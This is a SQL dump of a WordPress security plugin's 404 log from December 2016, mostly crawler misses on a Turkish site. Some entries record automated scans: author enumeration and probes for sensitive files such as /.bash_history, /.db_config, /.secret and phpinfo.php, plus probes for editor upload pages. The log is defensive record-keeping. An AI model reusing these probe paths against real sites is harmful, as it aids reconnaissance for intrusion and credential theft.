INSERT INTO `cmrfu_aiowps_events` VALUES("750","404","","0","2016-12-02 23:46:25","66.249.66.153","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("751","404","","0","2016-12-03 02:23:58","66.249.92.72","","/wp-content/uploads/wpcf7_captcha/1522867148.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("752","404","","0","2016-12-03 05:33:43","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("753","404","","0","2016-12-03 12:28:36","66.249.66.153","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("754","404","","0","2016-12-03 14:27:09","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/1522867148.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("755","404","","0","2016-12-03 17:25:21","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("756","404","","0","2016-12-04 04:51:03","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/1522867148.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("757","404","","0","2016-12-05 00:44:35","66.249.90.51","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("758","404","","0","2016-12-05 05:57:00","37.201.194.223","","/vmskdl44rededd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("759","404","","0","2016-12-05 05:57:03","37.201.194.223","","/vmskdl44rededd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("760","404","","0","2016-12-05 05:57:06","37.201.194.223","","/N0Wccvvd333.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("761","404","","0","2016-12-05 05:57:06","37.201.194.223","","/N0Wccvvd333.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("762","404","","0","2016-12-05 05:57:15","37.201.194.223","","/N0WaY/N0WaY1bb2/N0WaY123.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("763","404","","0","2016-12-05 05:57:29","37.201.194.223","","/N0WaY/N0WaY1bb2/N0WaY123.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("764","404","","0","2016-12-05 05:57:51","37.201.194.223","","/?author=2","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("765","404","","0","2016-12-05 05:57:54","37.201.194.223","","/?author=3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("766","404","","0","2016-12-05 05:57:57","66.249.65.52","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("767","404","","0","2016-12-05 05:57:57","37.201.194.223","","/?author=4","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("768","404","","0","2016-12-05 05:58:06","37.201.194.223","","/?author=5","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("769","404","","0","2016-12-05 05:58:08","37.201.194.223","","/?author=6","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("770","404","","0","2016-12-05 05:58:21","37.201.194.223","","/?author=7","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("771","404","","0","2016-12-05 05:58:22","37.201.194.223","","/?author=8","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("772","404","","0","2016-12-05 05:58:31","37.201.194.223","","/?author=9","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("773","404","","0","2016-12-05 05:58:40","37.201.194.223","","/?author=10","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("774","404","","0","2016-12-05 05:58:49","37.201.194.223","","/?author=11","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("775","404","","0","2016-12-05 05:58:52","37.201.194.223","","/?author=12","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("776","404","","0","2016-12-05 05:58:55","37.201.194.223","","/?author=13","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("777","404","","0","2016-12-05 05:58:58","37.201.194.223","","/?author=14","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("778","404","","0","2016-12-05 05:59:01","37.201.194.223","","/?author=15","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("779","404","","0","2016-12-05 05:59:04","37.201.194.223","","/?author=16","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("780","404","","0","2016-12-05 05:59:05","37.201.194.223","","/?author=17","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("781","404","","0","2016-12-05 05:59:08","37.201.194.223","","/?author=18","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("782","404","","0","2016-12-05 05:59:17","37.201.194.223","","/?author=19","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("783","404","","0","2016-12-05 05:59:19","37.201.194.223","","/?author=20","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("784","404","","0","2016-12-05 05:59:28","37.201.194.223","","/?author=21","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("785","404","","0","2016-12-05 05:59:31","37.201.194.223","","/?author=22","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("786","404","","0","2016-12-05 05:59:44","37.201.194.223","","/?author=23","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("787","404","","0","2016-12-05 05:59:47","37.201.194.223","","/?author=24","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("788","404","","0","2016-12-05 05:59:50","37.201.194.223","","/?author=25","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("789","404","","0","2016-12-05 05:59:51","37.201.194.223","","/?author=26","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("790","404","","0","2016-12-05 05:59:53","37.201.194.223","","/?author=27","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("791","404","","0","2016-12-05 05:59:54","37.201.194.223","","/?author=28","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("792","404","","0","2016-12-05 06:00:07","37.201.194.223","","/?author=29","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("793","404","","0","2016-12-05 06:00:20","37.201.194.223","","/.nksdjs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("794","404","","0","2016-12-05 06:00:23","37.201.194.223","","/.bash_profile","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("795","404","","0","2016-12-05 06:00:26","37.201.194.223","","/.bash_history","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("796","404","","0","2016-12-05 06:00:29","37.201.194.223","","/.bashrc","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("797","404","","0","2016-12-05 06:00:32","37.201.194.223","","/.db_config","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("798","404","","0","2016-12-05 06:00:45","37.201.194.223","","/.default","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("799","404","","0","2016-12-05 06:00:54","37.201.194.223","","/.logs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("800","404","","0","2016-12-05 06:01:03","37.201.194.223","","/.old","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("801","404","","0","2016-12-05 06:01:16","37.201.194.223","","/.private","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("802","404","","0","2016-12-05 06:01:29","37.201.194.223","","/.queries","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("803","404","","0","2016-12-05 06:01:30","37.201.194.223","","/.query","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("804","404","","0","2016-12-05 06:01:32","37.201.194.223","","/.secret","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("805","404","","0","2016-12-05 06:01:46","37.201.194.223","","/.sql","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("806","404","","0","2016-12-05 06:01:59","37.201.194.223","","/.temp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("807","404","","0","2016-12-05 06:02:13","37.201.194.223","","/phpinfo.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("808","404","","0","2016-12-05 06:02:17","37.201.194.223","","/pinfo.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("809","404","","0","2016-12-05 06:02:22","37.201.194.223","","/info.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("810","404","","0","2016-12-05 06:07:56","66.249.65.52","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("811","404","","0","2016-12-05 06:13:00","66.249.65.52","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("812","404","","0","2016-12-05 22:27:58","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/3086731693.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("813","404","","0","2016-12-05 23:49:37","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/3086731693.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("814","404","","0","2016-12-06 02:27:42","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/449841131.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("815","404","","0","2016-12-06 02:43:31","136.243.36.86","","/sitemap.xml","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("816","404","","0","2016-12-06 02:43:42","136.243.36.86","","/sitemap.xml","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("817","404","","0","2016-12-06 03:33:56","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/449841131.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("818","404","","0","2016-12-06 09:03:03","178.127.86.216","","/vmskdl44rededd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("819","404","","0","2016-12-06 09:03:10","178.127.86.216","","/vmskdl44rededd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("820","404","","0","2016-12-06 09:03:14","178.127.86.216","","/N0Wccvvd333.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("821","404","","0","2016-12-06 09:03:22","178.127.86.216","","/N0Wccvvd333.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("822","404","","0","2016-12-06 09:03:30","178.127.86.216","","/N0WaY/N0WaY1bb2/N0WaY123.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("823","404","","0","2016-12-06 09:03:35","178.127.86.216","","/N0WaY/N0WaY1bb2/N0WaY123.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("824","404","","0","2016-12-06 09:05:41","178.127.86.216","","/?author=2","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("825","404","","0","2016-12-06 09:05:48","178.127.86.216","","/?author=3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("826","404","","0","2016-12-06 09:05:57","178.127.86.216","","/?author=4","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("827","404","","0","2016-12-06 09:06:03","178.127.86.216","","/?author=5","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("828","404","","0","2016-12-06 09:06:07","178.127.86.216","","/?author=6","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("829","404","","0","2016-12-06 09:06:11","178.127.86.216","","/?author=7","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("830","404","","0","2016-12-06 09:06:16","178.127.86.216","","/?author=8","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("831","404","","0","2016-12-06 09:06:20","178.127.86.216","","/?author=9","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("832","404","","0","2016-12-06 09:06:25","178.127.86.216","","/?author=10","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("833","404","","0","2016-12-06 09:06:32","178.127.86.216","","/?author=11","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("834","404","","0","2016-12-06 09:06:36","178.127.86.216","","/?author=12","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("835","404","","0","2016-12-06 09:06:41","178.127.86.216","","/?author=13","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("836","404","","0","2016-12-06 09:06:46","178.127.86.216","","/?author=14","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("837","404","","0","2016-12-06 09:06:51","178.127.86.216","","/?author=15","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("838","404","","0","2016-12-06 09:06:56","178.127.86.216","","/?author=16","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("839","404","","0","2016-12-06 09:07:01","178.127.86.216","","/?author=17","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("840","404","","0","2016-12-06 09:07:05","178.127.86.216","","/?author=18","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("841","404","","0","2016-12-06 09:07:09","178.127.86.216","","/?author=19","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("842","404","","0","2016-12-06 09:07:11","178.127.86.216","","/?author=20","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("843","404","","0","2016-12-06 09:07:14","178.127.86.216","","/?author=21","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("844","404","","0","2016-12-06 09:07:17","178.127.86.216","","/?author=22","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("845","404","","0","2016-12-06 09:07:24","178.127.86.216","","/?author=23","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("846","404","","0","2016-12-06 09:07:26","178.127.86.216","","/?author=24","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("847","404","","0","2016-12-06 09:07:29","178.127.86.216","","/?author=25","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("848","404","","0","2016-12-06 09:07:32","178.127.86.216","","/?author=26","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("849","404","","0","2016-12-06 09:07:35","178.127.86.216","","/?author=27","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("850","404","","0","2016-12-06 09:07:37","178.127.86.216","","/?author=28","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("851","404","","0","2016-12-06 09:07:40","178.127.86.216","","/?author=29","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("852","404","","0","2016-12-06 09:07:44","178.127.86.216","","/.nksdjs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("853","404","","0","2016-12-06 09:07:47","178.127.86.216","","/.bash_profile","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("854","404","","0","2016-12-06 09:07:48","178.127.86.216","","/.bash_history","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("855","404","","0","2016-12-06 09:07:50","178.127.86.216","","/.bashrc","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("856","404","","0","2016-12-06 09:07:55","178.127.86.216","","/.db_config","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("857","404","","0","2016-12-06 09:08:00","178.127.86.216","","/.default","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("858","404","","0","2016-12-06 09:08:04","178.127.86.216","","/.logs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("859","404","","0","2016-12-06 09:08:12","178.127.86.216","","/.old","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("860","404","","0","2016-12-06 09:08:17","178.127.86.216","","/.private","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("861","404","","0","2016-12-06 09:08:23","178.127.86.216","","/.queries","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("862","404","","0","2016-12-06 09:08:27","178.127.86.216","","/.query","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("863","404","","0","2016-12-06 09:08:31","178.127.86.216","","/.secret","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("864","404","","0","2016-12-06 09:08:36","178.127.86.216","","/.sql","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("865","404","","0","2016-12-06 09:08:41","178.127.86.216","","/.temp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("866","404","","0","2016-12-06 09:08:48","178.127.86.216","","/phpinfo.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("867","404","","0","2016-12-06 09:08:53","178.127.86.216","","/pinfo.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("868","404","","0","2016-12-06 09:08:59","178.127.86.216","","/info.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("869","404","","0","2016-12-06 10:57:33","66.249.64.47","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("870","404","","0","2016-12-06 12:33:48","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/3086731693.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("871","404","","0","2016-12-06 16:55:43","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/449841131.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("872","404","","0","2016-12-07 00:44:18","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/3086731693.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("873","404","","0","2016-12-07 06:11:42","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/449841131.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("874","404","","0","2016-12-07 14:22:45","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/3086731693.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("875","404","","0","2016-12-07 15:15:04","66.249.64.58","","/images/kolaj1.jpg","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("876","404","","0","2016-12-07 15:15:15","66.249.64.54","","/images/baslik.jpg","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("877","404","","0","2016-12-07 15:15:31","66.249.64.54","","/images/menu_fon2.jpg","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("878","404","","0","2016-12-07 15:15:50","66.249.64.58","","/images/menu_fon.jpg","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("879","404","","0","2016-12-07 18:09:40","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/449841131.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("880","404","","0","2016-12-07 19:05:32","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/3973770611.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("881","404","","0","2016-12-08 01:36:28","66.249.64.56","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("882","404","","0","2016-12-08 02:07:09","66.249.64.54","","/hijyen.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("883","404","","0","2016-12-08 02:17:21","66.249.64.58","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("884","404","","0","2016-12-08 02:36:16","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/3086731693.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("885","404","","0","2016-12-08 04:36:51","66.249.64.54","","/iletisim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("886","404","","0","2016-12-08 07:09:35","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/449841131.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("887","404","","0","2016-12-08 15:08:25","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/3022405592.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("888","404","","0","2016-12-08 15:52:27","198.204.227.58","","/Editor/assetmanager/assetmanager.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("889","404","","0","2016-12-08 15:52:31","198.204.227.58","","/scripts/assetmanager/assetmanager.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("890","404","","0","2016-12-08 15:52:37","198.204.227.58","","/admin/assetmanager/assetmanager.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("891","404","","0","2016-12-08 15:52:44","198.204.227.58","","/assetmanager/assetmanager.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("892","404","","0","2016-12-09 00:16:18","66.249.69.168","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("893","404","","0","2016-12-09 00:46:34","66.249.91.82","","/wp-content/uploads/wpcf7_captcha/4237907256.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("894","404","","0","2016-12-09 00:49:10","66.249.91.83","","/wp-content/uploads/wpcf7_captcha/2368696789.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("895","404","","0","2016-12-09 02:01:04","66.249.91.82","","/wp-content/uploads/wpcf7_captcha/4237907256.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("896","404","","0","2016-12-09 02:01:36","66.249.91.82","","/wp-content/uploads/wpcf7_captcha/2368696789.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("897","404","","0","2016-12-09 02:23:25","141.8.142.47","","/wp-content/uploads/wpcf7_captcha/4128386358.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("898","404","","0","2016-12-09 07:02:21","66.249.69.166","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("899","404","","0","2016-12-09 07:26:14","66.249.69.160","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("900","404","","0","2016-12-09 09:29:07","157.55.39.140","","/turkce_r1_c1.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("901","404","","0","2016-12-09 14:10:06","66.249.91.9","","/wp-content/uploads/wpcf7_captcha/4237907256.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("902","404","","0","2016-12-09 14:10:38","66.249.91.5","","/wp-content/uploads/wpcf7_captcha/2368696789.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("903","404","","0","2016-12-09 18:03:28","217.69.133.169","","/favicon.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("904","404","","0","2016-12-10 03:30:14","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/4237907256.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("905","404","","0","2016-12-10 03:30:33","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/2368696789.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("906","404","","0","2016-12-10 03:55:12","78.174.126.17","","/apple-touch-icon-152x152-precomposed.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("907","404","","0","2016-12-10 03:55:13","78.174.126.17","","/apple-touch-icon-152x152.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("908","404","","0","2016-12-10 03:55:14","78.174.126.17","","/apple-touch-icon-precomposed.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("909","404","","0","2016-12-10 03:55:15","78.174.126.17","","/apple-touch-icon.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("910","404","","0","2016-12-10 03:55:16","78.174.126.17","","/apple-touch-icon-152x152-precomposed.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("911","404","","0","2016-12-10 03:55:17","78.174.126.17","","/apple-touch-icon-152x152.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("912","404","","0","2016-12-10 03:55:18","78.174.126.17","","/apple-touch-icon-precomposed.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("913","404","","0","2016-12-10 03:55:18","78.174.126.17","","/apple-touch-icon.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("914","404","","0","2016-12-10 05:48:08","66.249.64.51","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("915","404","","0","2016-12-10 05:53:16","66.249.64.51","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("916","404","","0","2016-12-10 05:53:17","66.249.64.49","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("917","404","","0","2016-12-10 09:33:17","66.249.64.56","","/tesis_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("918","404","","0","2016-12-10 16:09:29","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/4237907256.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("919","404","","0","2016-12-10 16:09:32","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/2368696789.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("920","404","","0","2016-12-10 23:10:06","66.249.64.54","","/hijyen.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("921","404","","0","2016-12-10 23:45:17","66.249.64.54","","/iletisim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("922","404","","0","2016-12-11 01:17:00","66.249.64.56","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("923","404","","0","2016-12-11 01:52:20","66.249.64.58","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("924","404","","0","2016-12-11 04:29:37","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/4237907256.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("925","404","","0","2016-12-11 04:30:01","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/2368696789.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("926","404","","0","2016-12-11 10:12:33","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1410491729.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("927","404","","0","2016-12-12 19:28:29","66.249.64.56","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("928","404","","0","2016-12-12 22:44:10","195.154.194.116","","/license.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("929","404","","0","2016-12-12 22:44:13","195.154.194.116","","/license.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("930","404","","0","2016-12-13 00:39:21","195.154.199.145","","/wp-content/upgrade/theme-compat/popup-pomo.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("931","404","","0","2016-12-13 05:03:43","66.249.64.54","","/hijyen.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("932","404","","0","2016-12-13 10:26:57","195.154.199.56","","/license.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("933","404","","0","2016-12-13 10:27:03","195.154.199.56","","/license.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("934","404","","0","2016-12-13 10:28:08","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/2457927824.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("935","404","","0","2016-12-13 15:05:34","66.249.64.58","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("936","404","","0","2016-12-13 15:56:35","66.249.64.54","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("937","404","","0","2016-12-13 18:28:36","66.249.64.54","","/iletisim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("938","404","","0","2016-12-13 21:23:34","198.204.227.58","","/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("939","404","","0","2016-12-13 21:23:35","198.204.227.58","","/editor/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("940","404","","0","2016-12-13 21:23:36","198.204.227.58","","/admin/editor/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("941","404","","0","2016-12-13 21:23:37","198.204.227.58","","/cms/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("942","404","","0","2016-12-13 21:23:38","198.204.227.58","","/admin/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("943","404","","0","2016-12-13 21:23:39","198.204.227.58","","/inv/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("944","404","","0","2016-12-13 21:23:40","198.204.227.58","","/packages/portal/includes/js/editor/editor/assetmanager/assetmanager.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("945","404","","0","2016-12-14 03:04:46","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/1732827531.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("946","404","","0","2016-12-14 04:35:21","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/1732827531.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("947","404","","0","2016-12-14 18:00:52","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/1732827531.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("948","404","","0","2016-12-15 02:33:30","66.249.92.138","","/wp-content/uploads/wpcf7_captcha/216331582.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("949","404","","0","2016-12-15 03:06:50","66.249.92.136","","/wp-content/uploads/wpcf7_captcha/216331582.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("950","404","","0","2016-12-15 07:08:55","66.249.92.136","","/wp-content/uploads/wpcf7_captcha/1732827531.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("951","404","","0","2016-12-15 16:31:27","66.249.92.139","","/wp-content/uploads/wpcf7_captcha/216331582.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("952","404","","0","2016-12-15 20:47:42","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/1732827531.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("953","404","","0","2016-12-16 05:39:28","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/216331582.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("954","404","","0","2016-12-16 09:20:36","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/1732827531.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("955","404","","0","2016-12-16 09:36:59","66.249.64.51","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("956","404","","0","2016-12-16 09:42:04","66.249.64.47","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("957","404","","0","2016-12-16 09:47:17","66.249.64.49","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("958","404","","0","2016-12-16 11:53:21","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/3075129826.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("959","404","","0","2016-12-16 18:42:09","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/216331582.png","","");
